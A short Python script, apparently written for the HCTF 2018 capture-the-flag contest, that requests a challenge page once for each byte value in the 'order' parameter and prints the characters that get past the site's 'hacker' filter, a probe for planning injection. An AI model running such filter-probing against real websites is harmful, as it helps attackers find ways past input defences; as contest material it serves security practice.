import requests as req
import time

headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.1.3527.300 Safari/524.63"
}
cookies = {
    "PHPSESSID": "vvvvvv"
}


def fuck():
    for i in range(1, 256):
        res = req.get(
            "http://game.2018.hctf.io/web2/user.php?order=%s" % chr(i), headers=headers, cookies=cookies)
        if res.status_code == 200 and b'hacker' not in res.content:
            print(i, chr(i))
            print(res.content.decode('utf-8'))
        time.sleep(1)
        # break


if __name__ == '__main__':
    fuck()
